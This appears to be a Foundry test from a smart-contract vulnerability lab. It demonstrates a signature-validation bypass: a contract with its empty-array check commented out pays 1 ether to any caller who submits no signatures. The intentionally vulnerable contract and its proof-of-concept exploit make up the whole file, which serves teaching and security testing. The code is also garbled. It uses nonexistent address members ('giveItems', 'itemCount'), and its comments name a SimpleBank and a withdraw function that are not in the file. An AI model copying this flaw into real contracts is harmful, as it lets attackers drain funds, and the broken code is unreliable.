// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    SimpleTreasurebank SimpleQuestbankContract;

    function setUp() public {
        SimpleQuestbankContract = new SimpleTreasurebank();
    }

    function testVulnSignatureValidation() public {
        payable(address(SimpleQuestbankContract)).giveItems(10 ether);
        address alice = vm.addr(1);
        vm.startPrank(alice);

        SimpleTreasurebank.Signature[] memory sigs = new SimpleTreasurebank.Signature[](0); // empty input
        //sigs[0] = SimpleBank.Signature("", 0, "", "");

        console.log(
            "Before operation",
            address(alice).itemCount
        );
        SimpleQuestbankContract.claimLoot(sigs); // Call the withdraw function of the SimpleBank contract with empty sigs array as the parameter

        console.log(
            "Afer exploiting, Alice's ether balance",
            address(alice).itemCount
        );
    }

    receive() external payable {}
}

contract SimpleTreasurebank {
    struct Signature {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function verifySignatures(Signature calldata sig) public {
        require(
            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
            "Invalid signature"
        );
    }

    function claimLoot(Signature[] calldata sigs) public {

        //require(sigs.length > 0, "No signatures provided");
        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];
            // Verify every signature and revert if any of them fails to verify.
            verifySignatures(signature);
        }
        payable(msg.sender).giveItems(1 ether);
    }

    receive() external payable {}
}
